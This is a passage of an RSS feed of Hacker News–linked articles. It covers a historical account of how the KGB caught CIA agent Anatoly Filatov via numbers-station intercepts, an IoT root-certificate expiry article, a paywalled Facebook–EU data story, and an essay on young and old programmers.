<p>As the author states the coded messages contained such instructions: “Do not contain yourself with gathering information within your service only. Gain trust of friends and relatives. Visit them at their workplaces, their homes, invite them to restaurants, and with careful, clever talking gain information you could not get yourself”<a href="#_ftn8" name="_ftnref8"><sup>[8]</sup></a>. The instructions also stated that the agency is not just interested in documents with “Top Secret” on it but also common information about his department and situation in it. Filatov was arrested on the 2nd of September 1977. As A. Kolpakidi states he was first sentenced to death in 1978 but instead was sent to labor camp 389/35 near Perm. In 1989 Filatov was visited by French journalists to whom he stated that he took very high stakes risks in his life which he lost and now naturally pays for it.</p>
<p>After release he demanded compensation from the US embassy, but was denied as a non citizen. The Russian TV company TV Center in 2014 made the documentary series “Завербуй меня, если сможешь” (Contract me if you can) and featured the A. Filatov case showing various pictures of him and accounts from his colleagues, such as Anatoly Tereshchenko, colonel of the military counter intel. Tereshchenko stated that if A. Filatov had come to the GRU and reported that he was lured into cooperation with the CIA, they could outplay the CIA, and Filatov would be a hero.<a href="#_ftn9" name="_ftnref9"><sup>[9]</sup></a> What became of Filatov after his release, is not known, the TV documentary showed his picture after his release. Possibly A. Filatov is dead now.</p>
<div id="attachment_166050"><p><a href="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov.png?ssl=1"><img aria-describedby="caption-attachment-166050" src="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov.png?resize=300%2C177&amp;ssl=1" alt="" width="300" height="177" srcset="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov.png?resize=300%2C177&amp;ssl=1 300w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov.png?resize=768%2C453&amp;ssl=1 768w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov.png?w=873&amp;ssl=1 873w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1"></a></p><p id="caption-attachment-166050">Anatoly Filatov</p></div>
<div id="attachment_166051"><p><a href="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov_2.png?ssl=1"><img aria-describedby="caption-attachment-166051" src="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov_2.png?resize=300%2C173&amp;ssl=1" alt="" width="300" height="173" srcset="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov_2.png?resize=300%2C173&amp;ssl=1 300w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov_2.png?resize=768%2C442&amp;ssl=1 768w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/A_Filatov_2.png?w=871&amp;ssl=1 871w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1"></a></p><p id="caption-attachment-166051">Anatoly Filatov years after the arrest</p></div>
<p>What will follow is a translation from Russian to English from the mentioned KGB manual, where the case about Filatov is described as an example of apprehending and capturing foreign spies who use radio signals and codes. With photo scans of included photo evidence.</p>

<p><em>Start of the original translation</em></p>
<div id="attachment_166052"><p><a href="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135640-scaled.jpg?ssl=1"><img aria-describedby="caption-attachment-166052" src="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135640.jpg?resize=225%2C300&amp;ssl=1" alt="" width="225" height="300" srcset="https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135640-scaled.jpg?resize=225%2C300&amp;ssl=1 225w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135640-scaled.jpg?resize=768%2C1024&amp;ssl=1 768w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135640-scaled.jpg?resize=1152%2C1536&amp;ssl=1 1152w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135640-scaled.jpg?resize=1536%2C2048&amp;ssl=1 1536w, https://i1.wp.com/www.numbers-stations.com/wp-content/uploads/2020/09/20200224_135640-scaled.jpg?w=1920&amp;ssl=1 1920w" sizes="(max-width: 225px) 100vw, 225px" data-recalc-dims="1"></a></p><p id="caption-attachment-166052">First page in the manual about A.FIlatov case</p></div>
<p>The case regarding American agent Filatov is particularly useful for agency and operative workers. Two agents who worked on this case had limited, but clear objectives: one controlled his work shifts, the other one lured him to a position within a GRU object (facility), where he was arrested. Secondary events were mostly carried out by the workers of the operational staff.</p>
<p>In the case materials the use of operational technical and criminal resources is very clearly displayed. The workers of the operational services had a clear objective: gain information about practical espionage activity.</p>
<p>A lot of support for apprehending the spy was provided by the GRU radio counterintelligence. During the first phase of the operation the counter radio intelligence played a helpful, but mostly backseat role, in terms of gaining radio information. However, after Filatov was discovered in possession of multiple ciphers the RCI<a href="#_ftn11" name="_ftnref11"><sup>[11]</sup></a> played the most active role in gaining information about the adversary’s plans for their agent. It must be asserted that the RCI data about the new communication line only gained importance after comprehensive analysis about known agents and data gained from agency postal communication lines.</p>
<p>It is useful to take note of the surveillance tactics used to monitor&nbsp; FIlatov, during all phases of the operation. Here the artistic use of surveillance, determination of the personality of the object, working out on his work conditions and living place (such an approach is essential for any future attempts for apprehending an adversary agent).</p>
<p>Finally it’s important to point out the very high level of secrecy is required to successfully&nbsp; carry out the operation, with minimal numbers&nbsp; of agents and operative staff workers as reglamented by the authority of KGB, and adjusted fully to the set parameters.</p>
<p>All this taken to an account assured that the case was carried out in highest quality the tasks were carried out decisively.</p>
<p>“””</p>
<p>The investigation into the incoming signals, and the timeline for the search for the CIA agent Filatov took place in the following order.</p>
<p>At the start of 1977 the second chief directorate of the KGB had received data that led to the belief that a new agent from American intelligence had become active within Soviet Union.</p>
<p>On January 21 and February 6 1977 the RCI had detected the transmission of operational (combat)<a href="#_ftn12" name="_ftnref12"><sup>[12]</sup></a> radiograms on the communication line sent from Frankfurt CIA radio center, that had appeared already in the first half of 1976.<a href="#_ftn13" name="_ftnref13"><sup>[13]</sup></a> With that the general reception of the radiograms was possible within the central part of European side of the USSR. <a href="#_ftn14" name="_ftnref14"><sup>[14]</sup></a></p>
<p>In this same timeframe espionage activity within CIA station inside the US embassy in Moscow, was observed to have increased, showing signs of preparing for creating operational dead drop communications, it was determined that these activities could not be part of the ongoing cases and operational games.</p>
<p>It was expected that the agent, after receiving operational radiograms, will likely make contact with the Frankfurt radio center using postal telegraph, telephone, dead drop, radio transmission or make a meeting with his handler, usually from US diplomatic service.</p>
<p>Taking this into account together with Operative-technical and Seventh authority of the KGB, extra measures were made to control the agency channels within Moscow and eavesdrop on CIA actions.</p>
<p>On February 9 1977 a postal parcel coming from Moscow to the US, a suspicious letter was identified which had signs which made its purpose likely being for espionage uses. This letter had a date indicating it was sent on February 7 and was written in the in English language “from English tourist”<a href="#_ftn15" name="_ftnref15"><sup>[15]</sup></a>. By using a physical-chemical method on the blank side of the letter, a cipher of 353 five number …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.numbers-stations.com/how-to-catch-a-spy-who-uses-numbers-stations-the-kgb-experience/">https://www.numbers-stations.com/how-to-catch-a-spy-who-uses-numbers-stations-the-kgb-experience/</a></em></p>]]>
            </description>
            <link>https://www.numbers-stations.com/how-to-catch-a-spy-who-uses-numbers-stations-the-kgb-experience/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541163</guid>
            <pubDate>Mon, 21 Sep 2020 08:50:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Coming Certificapocalypse]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24541002">thread link</a>) | @docdeek
<br/>
September 21, 2020 | https://witekio.com/iot-security-certificapocalypse/ | <a href="https://web.archive.org/web/*/https://witekio.com/iot-security-certificapocalypse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
	<div>
		<div>
			<h2>IoT Security Certificate: From the Internet of Things to the Internet of Trouble</h2>
<p>It all began with a couple of programmers that just wanted a cold Coke.</p>
<p>In 1982 computer science researchers at Carnegie Mellon University finally got fed up with making their way up three flights of stairs to find a vending machine that was sold out or – worse than that – buying a recently refilled soda only to find it was warm. To overcome their challenges, the programmers attached temperature switches to the machine and added connectivity that allowed anyone on the Carnegie Mellon network to know if there was Coke, and whether it was cold.</p>
<p>The Internet of Things (IoT) was born.</p>
<p>Of course, it took until 1999 for someone to put that name to these sorts of connected devices, and another ten years for these devices to outnumber actual human users of the internet. Since then, the IoT has continued to explode and today there are estimated to be more than 35 billion connected devices worldwide. Everyone from consumers looking to turn down their lights to industrial users looking to turn up their productivity have embraced the IoT, and the march of the connected device world seems unstoppable.</p>
<p>Or at least it did.</p>
<p>In the summer of 2020 alarm bells rang out regarding a major problem facing the world of IoT, one that had roots almost as far back as that Coke machine at Carnegie Mellon.<br>
So, what could bring IoT crashing down? IoT security certificates.</p>
<h2>IoT security certificates: The Root of the Problem</h2>
<p>An IoT security certificate is something like a personal identity card or passport. Just as your identity card or passport assures someone that you are who you say you are, a security certificate assures that the device is what it purports to be.</p>
<p>With an identity card or a passport, there is a single entity issuing the document, usually a national government. With a security certificate, however, there is more than a single issuing authority and, indeed, there is more than a single IoT security certificate for each website or device.</p>
		</div>
	</div>
</section><section>
	<div>
		<div>
			<p><span data-contrast="auto">When it comes to online security certificates there are always – at a minimum – three certificates:</span><span data-ccp-props="{}">&nbsp;</span></p>
<ul>
<li data-leveltext="" data-font="Symbol" data-listid="1" aria-setsize="-1" data-aria-posinset="1" data-aria-level="1"><span data-contrast="auto">The End-Entity certificate</span><span data-ccp-props="{&quot;134233279&quot;:true}">&nbsp;</span></li>
<li data-leveltext="" data-font="Symbol" data-listid="1" aria-setsize="-1" data-aria-posinset="2" data-aria-level="1"><span data-contrast="auto">The Intermediate CA&nbsp;</span><span data-contrast="auto">certificate</span><span data-ccp-props="{&quot;134233279&quot;:true}">&nbsp;</span></li>
<li data-leveltext="" data-font="Symbol" data-listid="1" aria-setsize="-1" data-aria-posinset="3" data-aria-level="1"><span data-contrast="auto">The Root CA certificate</span><span data-ccp-props="{&quot;134233279&quot;:true}">&nbsp;</span></li>
</ul>

			
		</div>
		<p><img data-src="https://witekio.com/wp-content/uploads/2020/09/Image1-1.png" alt="" src="https://witekio.com/wp-content/uploads/2020/09/Image1-1.png">
		</p>
	</div>
</section><section>
	<div>
		<div>
			<p>These certificates together form what is called a <a href="https://www.fir3net.com/Security/Concepts-and-Terminology/pki-chain-of-trust.html">chain of trust</a> and anyone familiar with a website running HTTPS, for example, would know that their security certificate regularly needs to be updated. As of September 2020, the longest lifetime for such a certificate will be one year meaning that website owners will need to update their certificates at least annually.</p>
<p>Yet beyond the browsable web, all other internet-enabled devices have their own certificates, too. A sensor on a machine in a factory, a connected medical device, even connected children’s toys all have IoT security certificates that must be valid for the device to function correctly.</p>
<p>But while updating or replacing a certificate for an individual website or device is one thing, it’s quite another when the root certificate expires. Being core to thousands or even millions of devices, these root certificates don’t require annual updating but they do still expire.</p>
<p>And when they do, there’s trouble waiting.</p>
<h3>May 30 10:48:38 2020 GMT</h3>
<p>A couple of months back the world got a taste of what happens when a root certificate authority expires.</p>
<p>A little before lunchtime in London on 30 May, the AddTrust External CA Root expired, and the turmoil began. As a result, security researcher <a href="https://scotthelme.co.uk/impending-doom-root-ca-expiring-legacy-clients/">Scott Helme</a> reported, IoT video streaming device Roku started losing access to some channels, global payment processor Stripe ran into issues, and competitor payment processor Spreedly was unable to process payments, too.</p>
<p>The underlying cause of these problems and the problems experienced by hundreds of other device makers and companies was the expiration of the root certificate authority. Without it, all of the intermediate and end-entity certificates associated with that root CA just don’t matter. Unless device manufacturers or he millions of end users update their devices, broken they will stay.</p>
<p>But this was just a preview.</p>
<p>As <a href="https://www.theregister.com/2020/06/10/iot_trouble_root_certificates_expire/">The Register</a> reported, we’re approaching a point in time now where there are lots of CA Root Certificates expiring in the next few years simply because it’s been 20+ years since the encrypted web really started up and that’s the lifetime of a Root CA certificate. If manufacturers continue to churn out IoT devices and products without thinking about the implications of an about-to-expire CA root certificate, the internet of things might quickly turn to an internet of trouble.</p>
<h3>Not All Doom and Gloom</h3>
<p>There is hope, though.</p>
<p>Indeed, the two-step solution is relatively simple to explain, if a little more complex to put into action.</p>
<p><strong>Step One involves pushing a firmware update to all impacted IoT devices.</strong> Pushing updated firmware with a certificate security chain that won’t expire in the short term is essential to maintaining device uptime and continuing to meet customer expectations for reliability, robustness, and quality. For some devices with a relatively short lifecycle, a well-constructed firmware update like this will be enough to avert problems altogether, at least for the useful and supported life of the device.</p>
<p><strong>Step Two involves taking steps to ensure this doesn’t become a problem again in the future.</strong> A dedicated software tool to manage the device IDs of a company’s IoT network would be ideal here. Not only would it keep track of the device, its IoT security certificate status, and highlight when that device is poised to enter a potentially unsecure period, it could also be used as part of the wider effort to manage the lifecycle of the company devices.</p>
<p>The first step is really the minimum that any conscientious organization is going to want to take, but it’s no panacea all on its own. The chain of trust system and the limitations on certificate validation periods mean it’s little more than a temporary stopgap.</p>
<p>The second step is aimed less at getting out of troublesome situations than at avoiding them altogether. With so many devices using so many certificates about to expire in the next few years, the time to start planning ahead is now.</p>
<p>As we approach the forty-year anniversary of the first somewhat-connected vending machine, the tens of billions of connected devices that now populate the planet are increasingly at threat from the very security that they hoped would protect. As CA Root certificates approach their expiration dates, entire IoT networks – industrial, consumer, in the factory and in the home – are at risk.</p>
<p>Reports note that the next major date on which a large number of root certificates will expire is <a href="https://www.tomsguide.com/news/smart-home-cert-disaster">30 September 2021</a>. With just over a year to go, the time to act is now.</p>
		</div>
	</div>
</section></div>]]>
            </description>
            <link>https://witekio.com/iot-security-certificapocalypse/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24541002</guid>
            <pubDate>Mon, 21 Sep 2020 08:20:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook fears ruling may force it to pull social media platforms from EU]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 106 (<a href="https://news.ycombinator.com/item?id=24540991">thread link</a>) | @rusk
<br/>
September 21, 2020 | https://www.businesspost.ie/legal/facebook-fears-ruling-may-force-it-to-pull-social-media-platforms-from-eu-00644da4 | <a href="https://web.archive.org/web/*/https://www.businesspost.ie/legal/facebook-fears-ruling-may-force-it-to-pull-social-media-platforms-from-eu-00644da4">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app">

        





<div>
    <div>
        <p>
            Wednesday September 23, 2020
        </p>
        
    </div>
</div>





        

        
    <div>
        
        
        <div>

            
            
                            <div>
                    
            
                            <p>Court filings show tech giant doesn’t believe it can convince Data Protection Commission to overturn preliminary ruling that bans transfer of data from EU to US</p>
                    
        
        

        
        
    </div>
            
                            
                <div id="img-article">
                    <figure>
                        
                        <figcaption>Under fire: Data Protection Commissioner Helen Dixon</figcaption>
                    </figure>
                </div>
                    </div>

        
        <div>
            <div>
                
                                    <div>
                                                    <div>
                                
                                <p>Facebook fears that a ruling by the Data Protection Commission (DPC) could force it to pull its social media platforms from Europe, High Court filings show.</p> <p>The social media giant said it does not believe it can convince the watchdog to overturn a preliminary ruling banning the transfer of personal data from EU citizens to servers in the US which relates to concerns about American intelligence agencies.</p> <p>In the filings which detail the gravity of...</p>
                            </div>
                        
                        
                                                    <div>
                                <div>
    <div>
        <h2>Subscribe from just €1 for the first month!</h2>
        <p>Exclusive offers:</p>
        <p>All Digital Access + eReader</p>
    </div>

            
        <div>
            <div>

                
                <div>
                    <h2>Trial</h2>
                                        <p>
                        €1
                                            </p>
                    <p>Unlimited Access for 1 Month</p>
                                            <p>Then €19.99 a month after the offer period.</p>
                                    </div>
                

                
            </div>
        </div>
            
        <div>
            <div>

                
                <div>
                    <h2>Annual</h2>
                                            <p>€200</p>
                                        <p>
                        €149
                                                    <span>For the 1st Year</span>
                                            </p>
                    <p>Unlimited Access for 1 Year</p>
                                    </div>
                

                
            </div>
        </div>
            
        <div>
            <div>

                
                <div>
                    <h2>Quarterly</h2>
                                            <p>€55</p>
                                        <p>
                        €42
                                            </p>
                    <p>90 Day Pass</p>
                                    </div>
                

                
            </div>
        </div>
            
        <div>
            <div>

                                    
                    <svg version="1.1" fill="#FFF" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 49.94 49.94" xml:space="preserve">
                        <path d="M48.856,22.73c0.983-0.958,1.33-2.364,0.906-3.671c-0.425-1.307-1.532-2.24-2.892-2.438l-12.092-1.757
                            c-0.515-0.075-0.96-0.398-1.19-0.865L28.182,3.043c-0.607-1.231-1.839-1.996-3.212-1.996c-1.372,0-2.604,0.765-3.211,1.996
                            L16.352,14c-0.23,0.467-0.676,0.79-1.191,0.865L3.069,16.622c-1.359,0.197-2.467,1.131-2.892,2.438
                            c-0.424,1.307-0.077,2.713,0.906,3.671l8.749,8.528c0.373,0.364,0.544,0.888,0.456,1.4L8.224,44.701
                            c-0.183,1.06,0.095,2.091,0.781,2.904c1.066,1.267,2.927,1.653,4.415,0.871l10.814-5.686c0.452-0.237,1.021-0.235,1.472,0
                            l10.815,5.686c0.526,0.277,1.087,0.417,1.666,0.417c1.057,0,2.059-0.47,2.748-1.288c0.687-0.813,0.964-1.846,0.781-2.904
                            l-2.065-12.042c-0.088-0.513,0.083-1.036,0.456-1.4L48.856,22.73z"></path>
                    </svg>
                
                <div>
                    <h2>2 Yearly</h2>
                                            <p>€315</p>
                                        <p>
                        €248
                                            </p>
                    <p>Unlimited Access for 2 Years</p>
                                    </div>
                

                <div>
                    <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="442.533px" height="442.533px" viewBox="0 0 442.533 442.533" style="enable-background:new 0 0 442.533 442.533;" xml:space="preserve">
                        <path d="M434.539,98.499l-38.828-38.828c-5.324-5.328-11.799-7.993-19.41-7.993c-7.618,0-14.093,2.665-19.417,7.993L169.59,247.248
                            l-83.939-84.225c-5.33-5.33-11.801-7.992-19.412-7.992c-7.616,0-14.087,2.662-19.417,7.992L7.994,201.852
                            C2.664,207.181,0,213.654,0,221.269c0,7.609,2.664,14.088,7.994,19.416l103.351,103.349l38.831,38.828
                            c5.327,5.332,11.8,7.994,19.414,7.994c7.611,0,14.084-2.669,19.414-7.994l38.83-38.828L434.539,137.33
                            c5.325-5.33,7.994-11.802,7.994-19.417C442.537,110.302,439.864,103.829,434.539,98.499z"></path>
                    </svg><p>
                    This product does not auto-renew
                </p></div>
            </div>
        </div>
    
    
    <div>
        <div>
            <h2>Team Pass</h2>
            <p>Get a Business Account for you and your team</p>
        </div>
        
    </div>
    
    
</div>

                            </div>
                                            </div>
                            </div>
        </div>

        

        
                    
            </div>

        

    </div></div>]]>
            </description>
            <link>https://www.businesspost.ie/legal/facebook-fears-ruling-may-force-it-to-pull-social-media-platforms-from-eu-00644da4</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540991</guid>
            <pubDate>Mon, 21 Sep 2020 08:18:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We need young programmers; We need old programmers]]>
            </title>
            <description>
<![CDATA[
Score 269 | Comments 244 (<a href="https://news.ycombinator.com/item?id=24540919">thread link</a>) | @mrcsharp
<br/>
September 21, 2020 | https://blog.ploeh.dk/2020/09/14/we-need-young-programmers-we-need-old-programmers/ | <a href="https://web.archive.org/web/*/https://blog.ploeh.dk/2020/09/14/we-need-young-programmers-we-need-old-programmers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>
		<em>The software industry loves young people, but old-timers serve an important purpose, too.</em>
	</p>
	<p>
		Our culture idolises youth. There's several reasons for this, I believe. Youth seems synonymous with vigour, strength, beauty, and many other desirable qualities. The cynical perspective is that young people, while rebellious, also tend to be easy to manipulate, if you know which buttons to push. A middle-aged man like me isn't susceptible to the argument that I should buy a particular pair of Nike shoes because they're named after Michael Jordan, but for a while, one pair wasn't enough for my teenage daughter.
	</p>
	<p>
		In intellectual pursuits (like software development), youth is often extolled as the source of innovation. You're often confronted with examples like that of <a href="https://en.wikipedia.org/wiki/%C3%89variste_Galois">Évariste Galois</a>, who made all his discoveries before turning 21. <a href="https://en.wikipedia.org/wiki/Ada_Lovelace">Ada Lovelace</a> was around 28 years when she produced what is considered the 'first computer program'. <a href="https://en.wikipedia.org/wiki/Alan_Turing">Alan Turing</a> was 24 when he wrote <a href="https://en.wikipedia.org/wiki/Turing%27s_proof">On Computable Numbers, with an Application to the Entscheidungsproblem</a>.
	</p>
	<p>
		Clearly, young age is no detriment to making ground-breaking contributions. It has even become folklore that everyone past the age of 35 is a has-been whose only chance at academic influence is to write a textbook.
	</p>
	<h3 id="800321a74c054ea0b75815c86f4ce18d">
		The story of the five monkeys <a href="#800321a74c054ea0b75815c86f4ce18d" title="permalink">#</a>
	</h3>
	<p>
		You may have seen a story called <em>the five monkeys experiment</em>. It's most likely a fabrication, but it goes like this:
	</p>
	<p>
		A group of scientists placed five monkeys in a cage, and in the middle, a ladder with bananas on the top. Every time a monkey went up the ladder, the scientists soaked the rest of the monkeys with cold water. After a while, every time a monkey went up the ladder, the others would beat it up.
	</p>
	<p>
		After some time, none of the monkeys dared go up the ladder regardless of the temptation. The scientists then substituted one of the monkeys with a new one, who'd immediately  go for the bananas, only to be beaten up by the others. After several beatings, the new member learned not to climb the ladder even though it never knew why.
	</p>
	<p>
		A second monkey was substituted and the same occurred. The first monkey participated in beating the second. A third monkey was exchanged and the story repeated. The fourth was substituted and the beating was repeated. Finally the fifth monkey was replaced.
	</p>
	<p>
		Left was a group of five monkeys who, even though they never received a cold shower, continued to beat up any monkey who attempted to climb the ladder. If it was possible to ask the monkeys why they would beat up all who attempted to go up the ladder, the answer would probably be:
	</p>
	<p>
		"That's how we do things here."
	</p>
	<p>
		While the story is probably just that: a story, it tells us something about the drag induced by age and experience. If you've been in the business for decades, you've seen numerous failed attempts at something you yourself tried when you were young. You know that it can't be done.
	</p>
	<p>
		Young people don't know that a thing can't be done. If they can avoid the monkey-beating, they'll attempt the impossible.
	</p>
	<h3 id="4add8a9af0424d7e889d3125837ed611">
		Changing circumstances <a href="#4add8a9af0424d7e889d3125837ed611" title="permalink">#</a>
	</h3>
	<p>
		Is attempting the impossible a good idea?
	</p>
	<p>
		In general, no, because it's... impossible. There's a reason older people tell young people that a thing can't be done. It's not just because they're stodgy conservatives who abhor change. It's because they see the effort as wasteful. Perhaps they're even trying to be kind, guiding young people off a path where only toil and disappointment is to be found.
	</p>
	<p>
		What old people don't realise is that sometimes, circumstances change.
	</p>
	<p>
		What was impossible twenty years ago may not be impossible today. We see this happening in many fields. Producing a commercially viable electric car was impossible for decades, until, with the advances made in battery technology, it became possible.
	</p>
	<p>
		Technology changes rapidly in software development. People trying something previously impossible may find that it's possible today. Once, if you had lots of data, you had to store it in fully normalised form, because storage was expensive. For a decade, relational databases were the only game in town. Then circumstances changed. Storage became cheaper, and a new movement of NoSQL storage emerged. What was before impossible became possible.
	</p>
	<p>
		Older people often don't see the new opportunities, because they 'know' that some things are impossible. Young people push the envelope driven by a combination of zest and ignorance. Most fail, but a few succeed.
	</p>
	<h3 id="4272a069588e47f796646bd282b9de02">
		Lottery of the impossible <a href="#4272a069588e47f796646bd282b9de02" title="permalink">#</a>
	</h3>
	<p>
		I think of this process as a lottery. Imagine that every impossible thing is a red ball in an urn. Every young person who tries the impossible draws a random ball from the urn.
	</p>
	<p>
		The urn contains millions of red balls, but every now and then, one of them turns green. You don't know which one, but if you draw it, it represents something that was previously impossible which has now become possible.
	</p>
	<p>
		This process produces growth, because once discovered, the new and better way of doing things can improve society in general. Occasionally, the young discoverer may even gain some fame and fortune.
	</p>
	<p>
		It seems wasteful, though. Most people who attempt the impossible will reach the predictable conclusion. What was deemed impossible was, indeed, impossible.
	</p>
	<p>
		When I'm in a cynical mood, I don't think that it's youth in itself that is the source of progress. It's just the <a href="https://en.wikipedia.org/wiki/Law_of_large_numbers">law of large numbers</a> applied. If there's a one in million chance that something will succeed, but ten million people attempt it, it's only a matter of time before one succeeds.
	</p>
	<p>
		Society at large can benefit from the success of the few, but ten million people still wasted their efforts.
	</p>
	<h3 id="016744f0ea77495c958a7914f08187db">
		We need the old, too <a href="#016744f0ea77495c958a7914f08187db" title="permalink">#</a>
	</h3>
	<p>
		If you accept the argument that young people are more likely to try the impossible, we need the young people. Do we need the old people?
	</p>
	<p>
		I'm turning fifty in 2020. You may consider that old, but I expect to work for many more years. I don't know if the software industry needs fifty-year-olds, but that's not the kind of old I have in mind. I'm thinking of people who have retired, or are close to retirement.
	</p>
	<p>
		In our youth-glorifying culture, we tend to dismiss the opinion and experiences of old people. <em>Oh, well, it's just a codgy old man</em> (or woman), we'll say.
	</p>
	<p>
		We ignore the experience of the old, because we believe that they haven't been keeping up with times. Their experiences don't apply to us, because we live under new circumstance. Well, see above.
	</p>
	<p>
		I'm not advocating that we turn into a gerontocracy that venerates our elders solely because of their age. Again, according to the law of large numbers, some people live to old age. There need not be any correlation between survivors and wisdom.
	</p>
	<p>
		We need the old to tell us the truth, because they have little to lose.
	</p>
	<h3 id="8b5c613ba6c44bb4b4e6dbba7ae7d19a">
		Nothing to lose <a href="#8b5c613ba6c44bb4b4e6dbba7ae7d19a" title="permalink">#</a>
	</h3>
	<p>
		In the last couple of years, I've noticed a trend. A book comes out, exposing the sad state of affairs in some organisation. This has happened regularly in Denmark, where I live. One book may expose the deplorable conditions of the Danish tax authorities, one may describe the situation in the ministry of defence, one criticises the groupthink associated with the climate crisis, and so on.
	</p>
	<p>
		Invariably, it turns out that the book is written by a professor emeritus or a retired department head.
	</p>
	<p>
		I don't think that these people, all of a sudden, had an epiphany after they retired. They knew all about the rot in the system they were part of, while they were part of it, but they've had too much to lose. You could argue that they should have said something before they retired, but that requires a moral backbone we can't expect most people to have.
	</p>
	<p>
		When people retire, the threat of getting fired disappears. Old people can speak freely to a degree most other people can't.
	</p>
	<p>
		Granted, many may simply use that freedom to spew bile or shout <em>Get off my lawn!</em>, but many are in the unique position to reveal truths no-one else dare speak. Many are, perhaps, just bitter, but some may possess knowledge that they are in a unique position to reveal.
	</p>
	<p>
		When that grumpy old guy on Twitter writes something that makes you uncomfortable, consider this: he may still be right.
	</p>
	<h3 id="2d64bd2c7ccb4b7ca2418802ed82689e">
		Being unreasonable <a href="#2d64bd2c7ccb4b7ca2418802ed82689e" title="permalink">#</a>
	</h3>
	<p>
		In a way, you could say that we need young and old people for the same fundamental reason. Not all of them, but enough of them, are in a position to be unreasonable.
		</p><blockquote>
			<p>
				"The reasonable man adapts himself to the world: the unreasonable one persists in trying to adapt the world to himself. Therefore all progress depends on the unreasonable man."
			</p>
			
		</blockquote><p>
		Young people and old people are unreasonable in each their own way, and we need both.
	</p>
	<h3 id="df88f595ec814e2bafcbd018ff5f5ad2">
		Conclusion <a href="#df88f595ec814e2bafcbd018ff5f5ad2" title="permalink">#</a>
	</h3>
	<p>
		We need young people in the software development industry. Because of their vigour and inexperience, they'll push the envelope. Most will fail to do the impossible, but a few succeed.
	</p>
	<p>
		This may seem like a cynical view, but we've all been young, and most of us have been through such a phase. It's like a rite of passage, and even if you fail to make your mark on the world, you're still likely to have learned a lot.
	</p>
	<p>
		We need old people because they're in a position to speak truth to the world. Notice that I didn't make my argument about the <em>experience</em> of old-timers. Actually, I find that valuable as well, but that's the ordinary argument: <em>Listen to old people, because they have experience and wisdom.</em>
	</p>
	<p>
		Some of them do, at least.
	</p>
	<p>
		I didn't make much out of that argument, because you already know it. There'd be no reason to write this essay if that was all I had to say. Old people have less on the line, so they can speak more freely. If someone you used to admire retires and all of a sudden starts saying or writing unpleasant and surprising things, there might be a good explanation, and it might be a good idea to pay attention.
	</p>
	<p>
		Or …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.ploeh.dk/2020/09/14/we-need-young-programmers-we-need-old-programmers/">https://blog.ploeh.dk/2020/09/14/we-need-young-programmers-we-need-old-programmers/</a></em></p>]]>
            </description>
            <link>https://blog.ploeh.dk/2020/09/14/we-need-young-programmers-we-need-old-programmers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540919</guid>
            <pubDate>Mon, 21 Sep 2020 08:05:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Availability, Maintainability, Reliability: What's the Difference?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24540809">thread link</a>) | @kiyanwang
<br/>
September 21, 2020 | https://www.blameless.com/blog/availability-maintainability-reliability-whats-the-difference | <a href="https://web.archive.org/web/*/https://www.blameless.com/blog/availability-maintainability-reliability-whats-the-difference">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We live in an era of reliability where users depend on having consistent access to services. When choosing between competing services, <a href="https://www.blameless.com/blog/the-importance-of-reliability-engineering">no feature is more important to users than reliability</a>. But what does reliability mean?<br></p><p>To answer this question, we’ll break down reliability in terms of other metrics within reliability engineering: availability and maintainability. Distinguishing these terms isn’t a matter of semantics. Understanding the differences can help you better prioritize development efforts towards customer happiness.</p><h3>Availability</h3><p><strong>Availability</strong> is the simplest building block of reliability. This metric describes what percentage of the time a service is functioning. This is also referred to as the “uptime” of a service. Availability can be monitored by continuously querying the service and confirming responses return with expected speed and accuracy.<br></p><p>A service’s availability is a major component in how a user perceives the reliability. With this in mind, it can be tempting to set a goal for 100% uptime. But SRE teaches us that failure is inevitable; downtime-causing incidents will always occur outside of engineering expectations. Availability is often expressed in “nines,” representing how many decimal places the percentage of uptime can reach. Some 